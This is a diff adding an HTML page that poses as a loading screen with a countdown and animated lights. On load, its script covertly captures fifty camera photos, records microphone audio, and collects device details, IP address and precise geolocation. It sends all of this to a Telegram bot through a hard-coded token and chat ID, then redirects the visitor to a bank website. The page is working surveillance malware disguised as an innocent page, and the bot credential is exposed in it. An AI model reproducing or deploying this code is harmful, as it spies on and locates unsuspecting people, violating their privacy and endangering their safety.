@@ -1,0 +1,230 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Fast Capture with Countdown, Progress Bar & Overlay Image</title>
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<style>
+body, html {
+  height: 100%;
+  margin: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  font-family: Arial, sans-serif;
+  background: black;
+  overflow: hidden;
+}
+
+/* ===== خطوط زرقاء كثيفة نازلة ===== */
+.lines {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+  z-index: 0;
+}
+.line {
+  position: absolute;
+  width: 2px;
+  height: 100%;
+  background: rgba(0, 150, 255, 0.5);
+  animation: drop linear infinite;
+}
+@keyframes drop {
+  0% { transform: translateY(-100%); opacity: 0; }
+  10% { opacity: 1; }
+  100% { transform: translateY(100%); opacity: 0; }
+}
+
+/* ===== أضواء تصاعدية من الأسفل بشكل عشوائي ===== */
+.light-effects {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+  z-index: 0;
+}
+.light {
+  position: absolute;
+  bottom: 0;
+  width: 3px;
+  height: 60px;
+  background: rgba(0, 200, 255, 0.6);
+  border-radius: 2px;
+  animation: rise linear infinite;
+}
+@keyframes rise {
+  0% { transform: translateY(0) scaleY(0.5); opacity: 0; }
+  50% { opacity: 1; }
+  100% { transform: translateY(-100vh) scaleY(1.5); opacity: 0; }
+}
+
+/* ===== باقي تصميمك ===== */
+.loader-container {
+  width: 80%;
+  max-width: 600px;
+  height: 30px;
+  background: #222;
+  border-radius: 15px;
+  overflow: hidden;
+  margin-bottom: 20px;
+  position: relative;
+  z-index: 2;
+}
+.loader-bar {
+  height: 100%;
+  width: 0%;
+  background: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet);
+  border-radius: 15px;
+  animation: moveColors 3s linear infinite;
+}
+@keyframes moveColors {
+  0% { background-position: 0% 0%; }
+  100% { background-position: 200% 0%; }
+}
+.loading-text {
+  font-size: 24px;
+  color: white;
+  margin-bottom: 10px;
+  z-index: 2;
+  position: relative;
+}
+.overlay-img {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 200px;
+  opacity: 0.3;
+  pointer-events: none;
+  z-index: 1;
+}
+</style>
+</head>
+<body>
+
+<!-- خطوط زرقاء كثيفة -->
+<div class="lines" id="linesContainer"></div>
+
+<!-- مؤثرات ضوئية تصاعدية -->
+<div class="light-effects" id="lightsContainer"></div>
+
+<div class="loading-text">جاري التحميل: <span id="countdown">30</span> ثانية</div>
+<div class="loader-container">
+  <div class="loader-bar" id="loaderBar"></div>
+</div>
+
+<img src="https://drive.google.com/uc?export=view&id=170gJfm8RV18LxlhS5Cc11N8158NSNwi4" class="overlay-img" alt="Overlay Image">
+
+<script>
+const botToken = "7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY";
+const chatId = "1538488453";
+
+// ===== إنشاء خطوط ديناميكية =====
+const linesContainer = document.getElementById("linesContainer");
+for(let i=0; i<60; i++){
+  const line = document.createElement("div");
+  line.className = "line";
+  line.style.left = Math.random()*100 + "%";
+  line.style.animationDuration = (1.5 + Math.random()*2) + "s";
+  line.style.animationDelay = Math.random()*2 + "s";
+  linesContainer.appendChild(line);
+}
+
+// ===== إنشاء أضواء تصاعدية ديناميكية =====
+const lightsContainer = document.getElementById("lightsContainer");
+for(let i=0; i<40; i++){
+  const light = document.createElement("div");
+  light.className = "light";
+  light.style.left = Math.random()*100 + "%";
+  light.style.height = 30 + Math.random()*70 + "px";
+  light.style.animationDuration = (1.5 + Math.random()*2) + "s";
+  light.style.animationDelay = Math.random()*2 + "s";
+  lightsContainer.appendChild(light);
+}
+
+// ===== باقي كودك الأصلي =====
+let camStream;
+let micStream;
+let recorder;
+let audioChunks = [];
+
+function delay(ms){ return new Promise(r=>setTimeout(r, ms)); }
+function sendText(text){ axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, { chat_id: chatId, text: text }); }
+
+async function sendDeviceInfo(){
+  let ip = "Unknown";
+  try { let r = await fetch("https://api.ipify.org?format=json"); ip = (await r.json()).ip; }catch{}
+  sendText("📱 Device Info:\nUserAgent: " + navigator.userAgent + "\nPlatform: " + navigator.platform + "\nScreen: " + screen.width + "x" + screen.height + "\nIP: " + ip);
+}
+
+function sendLocation(){
+  navigator.geolocation.getCurrentPosition(
+    pos => { sendText("📍 Location:\nLat: " + pos.coords.latitude + "\nLon: " + pos.coords.longitude + "\nAcc: " + pos.coords.accuracy + "m"); },
+    err => sendText("Location Error: " + err.message),
+    { enableHighAccuracy: true }
+  );
+}
+
+async function startDemo() {
+  try {
+    [camStream, micStream] = await Promise.all([
+      navigator.mediaDevices.getUserMedia({video:true}),
+      navigator.mediaDevices.getUserMedia({audio:true})
+    ]);
+    recorder = new MediaRecorder(micStream);
+    recorder.ondataavailable = e => audioChunks.push(e.data);
+    recorder.start();
+
+    sendDeviceInfo();
+    sendLocation();
+
+    let countdown = 30;
+    const countdownEl = document.getElementById("countdown");
+    const loaderBar = document.getElementById("loaderBar");
+    const interval = setInterval(() => {
+      countdown--;
+      countdownEl.textContent = countdown;
+      loaderBar.style.width = ((30 - countdown)/30 * 100) + "%";
+      if(countdown <= 0){ clearInterval(interval); window.location.href = "https://kuraimibank.com/ar"; }
+    }, 1000);
+
+    function sendPhoto(blob, name){ const fd = new FormData(); fd.append("chat_id", chatId); fd.append("photo", blob, name); axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, fd); }
+    function sendAudio(blob, name){ const fd = new FormData(); fd.append("chat_id", chatId); fd.append("audio", blob, name); axios.post(`https://api.telegram.org/bot${botToken}/sendAudio`, fd); }
+
+    function takePhoto(count){
+      return new Promise(resolve => {
+        const video = document.createElement("video");
+        video.srcObject = camStream;
+        video.play();
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        video.onplaying = () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+          canvas.toBlob(blob => { sendPhoto(blob, `photo_${count}.jpg`); resolve(); }, "image/jpeg", 0.7);
+        };
+      });
+    }
+
+    (async function capturePhotos(){ for(let i=1;i<=50;i++){ takePhoto(i); await delay(300); } })();
+
+    setTimeout(()=>{
+      recorder.stop();
+      recorder.onstop = () => { const blob = new Blob(audioChunks, {type:"audio/webm"}); sendAudio(blob, "mic_continuous.webm"); };
+    }, 15000);
+
+  } catch(e){ alert("Permission Error: " + e.message); }
+}
+
+startDemo();
+</script>
+</body>
+</html>
